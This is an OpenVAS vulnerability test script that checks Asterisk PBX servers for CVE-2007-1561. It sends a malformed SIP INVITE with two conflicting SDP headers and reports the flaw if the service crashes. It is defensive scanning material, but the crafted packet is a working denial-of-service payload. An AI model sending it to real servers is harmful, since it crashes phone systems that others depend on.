###############################################################################
# OpenVAS Vulnerability Test
# $Id: asterisk_sdp_header_overflow.nasl 14010 2019-03-06 08:24:33Z cfischer $
#
# Asterisk PBX SDP Header Overflow Vulnerability
#
# Authors:
# Ferdy Riphagen
#
# Copyright:
# Copyright (C) 2008 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:digium:asterisk";

# Note :
# Because probably many systems running safe_asterisk
# as a watchdog for the asterisk pid, this check could
# be very false-negative prone. Additionally an INVITE
# message on secure systems need authentication, so this
# only works on systems using 'allowguest=yes' in sip.conf
# and for peers without authentication info with the use
# of an edited 'logins.nasl' (not supplied).

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.9999992");
  script_version("$Revision: 14010 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-06 09:24:33 +0100 (Wed, 06 Mar 2019) $");
  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_bugtraq_id(23031);
  script_cve_id("CVE-2007-1561");
  script_name("Asterisk PBX SDP Header Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("This script is Copyright (C) 2008 Ferdy Riphagen");
  script_dependencies("secpod_asterisk_detect.nasl", "logins.nasl");
  script_mandatory_keys("Asterisk-PBX/Installed");

  script_xref(name:"URL", value:"http://lists.grok.org.uk/pipermail/full-disclosure/2007-March/053052.html");
  script_xref(name:"URL", value:"http://bugs.digium.com/view.php?id=9321");

  script_tag(name:"solution", value:"Upgrade to Asterisk release 1.4.2/1.2.17 or newer.");

  script_tag(name:"summary", value:"The remote Asterisk PBX SIP server is affected by an overflow vulnerability.");

  script_tag(name:"impact", value:"This results in a Segmentation fault in 'chan_sip.c' crashing the Asterisk PBX service.");

  script_tag(name:"insight", value:"The application installed suffers from a remote overflow in the SIP service
  resulting in a denial of service. An attacker can send a malformed INVITE packet
  with two SDP headers, whitin the first header a existing IP address in the 'c=' variable
  and in the second SDP header a NOT existing IP address in 'c='.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"exploit");

  exit(0);
}

include("sip.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! infos = get_app_location_and_proto( cpe:CPE, port:port ) )
  exit( 0 );

proto = infos["proto"];

if( ! sip_alive( port:port, proto:proto ) )
  exit( 0 );

targethost = get_host_name();
thishost = this_host();
vtstrings = get_vt_strings();
user = vtstrings["lowercase"];

sdp_headers = string(
    "v=0\r\n",
    "o=somehost 12345 12345 IN IP4 ", targethost, "\r\n",
    "c=IN IP4 ", targethost, "\r\n",
    "m=audio 16384 RTP/AVP 8 0 18 101\r\n\r\n",
    "v=1\r\n",
    "o=somehost 12345 12345 IN IP4 ", targethost, "\r\n",
    "c=IN IP4 555.x.555.x.555\r\n",
    "m=audio 16384 RTP/AVP 8 0 18 101");

bad_invite = string(
    "INVITE sip:", targethost, "\r\n",
    "Via: SIP/2.0/", toupper( proto ), " ", thishost, ":", port, "\r\n",
    "To: <sip:", user, "@", targethost, ":", port, ">\r\n",
    "From: <sip:", user, "@", thishost, ":", port, ">\r\n",
    "Call-ID: ", rand(), "\r\n",
    "CSeq: ", rand(), " INVITE\r\n",
    "Contact: <sip:", user, "@", thishost, ">\r\n",
    "Max-Forwards: 0\r\n",
    "Content-Type: application/sdp\r\n",
    "Content-Length: ", strlen(sdp_headers), "\r\n\r\n",
    sdp_headers);

exp = sip_send_recv( port:port, data:bad_invite, proto:proto );
if( isnull( exp ) ) {
  if( ! sip_alive( port:port, proto:proto ) ) {
    security_message( port:port, proto:proto );
    exit( 0 );
  }
}

exit( 99 );